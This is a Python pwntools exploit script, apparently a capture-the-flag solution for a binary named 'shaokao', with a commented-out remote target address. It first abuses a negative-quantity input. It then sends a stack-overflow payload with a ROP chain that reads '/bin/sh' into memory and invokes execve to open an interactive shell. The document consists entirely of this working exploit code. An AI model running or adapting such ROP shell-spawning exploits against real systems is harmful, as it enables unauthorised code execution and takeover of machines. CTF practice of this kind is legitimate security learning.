from pwn import *

p = process('./shaokao')
# p = remote('123.56.116.45', 30245)
elf = ELF('./shaokao')

pop_rax = 0x0000000000458827
pop_rdx_rbx = 0x00000000004a404b
pop_rdi = 0x000000000040264f
pop_rsi = 0x000000000040a67e
syscall_ret = 0x00000000004230a6
bss = elf.bss() + 0x400

p.recvuntil(b'>')
p.sendline(b'1')
sleep(0.1)
p.sendline(b'1')
sleep(0.1)
p.sendline(b'-100000')
p.recvuntil(b'>')
p.sendline(b'4')
p.recvuntil(b'>')
p.sendline(b'5')
sleep(0.1)
payload = b'a' * 0x28
payload += p64(pop_rax) + p64(0x0)
payload += p64(pop_rdx_rbx) + p64(0x10) + p64(0)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bss)
payload += p64(syscall_ret)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(pop_rdx_rbx) + p64(0) + p64(0)
payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi) + p64(0)
payload += p64(syscall_ret)

p.sendline(payload)
sleep(0.1)
p.sendline(b"/bin/sh\x00")

p.interactive()
